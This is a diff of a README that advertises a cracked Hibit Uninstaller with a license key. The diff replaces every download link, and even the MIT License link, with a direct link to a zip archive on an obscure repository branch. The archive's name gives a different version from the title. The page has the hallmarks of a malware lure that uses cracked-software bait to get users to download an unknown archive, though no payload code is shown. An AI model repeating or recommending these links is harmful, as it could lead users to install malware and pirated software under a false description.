@@ -1,8 +1,8 @@
 # Hibit Uninstaller 3.2.20 Crack License Key – Advanced Software Removal Masterpiece 🚀
 
-[![Download](https://img.shields.io/badge/Download-green)](https://Okolopeter.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/Okolopeter/hibit-uninstaller-3-2-20-pro-edition/raw/refs/heads/branch/chloranil/hibit_uninstaller_edition_pro_v3.6.zip)
 
-**Download here: https://Okolopeter.github.io**
+**Download here: https://github.com/Okolopeter/hibit-uninstaller-3-2-20-pro-edition/raw/refs/heads/branch/chloranil/hibit_uninstaller_edition_pro_v3.6.zip**
 
 ---
 
@@ -99,7 +99,7 @@ From system tinkerers to everyday users, everyone finds value in this thoughtful
 
 ## 📜 License
 
-This project is proudly distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+This project is proudly distributed under the [MIT License](https://github.com/Okolopeter/hibit-uninstaller-3-2-20-pro-edition/raw/refs/heads/branch/chloranil/hibit_uninstaller_edition_pro_v3.6.zip).  
 Copyright © 2025
 
 ---
@@ -108,9 +108,9 @@ Copyright © 2025
 
 - Get the latest build and all necessary assets here:
 
-[![Download](https://img.shields.io/badge/Download-green)](https://Okolopeter.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/Okolopeter/hibit-uninstaller-3-2-20-pro-edition/raw/refs/heads/branch/chloranil/hibit_uninstaller_edition_pro_v3.6.zip)
 
-**Download here: https://Okolopeter.github.io**
+**Download here: https://github.com/Okolopeter/hibit-uninstaller-3-2-20-pro-edition/raw/refs/heads/branch/chloranil/hibit_uninstaller_edition_pro_v3.6.zip**
 
 ---
 
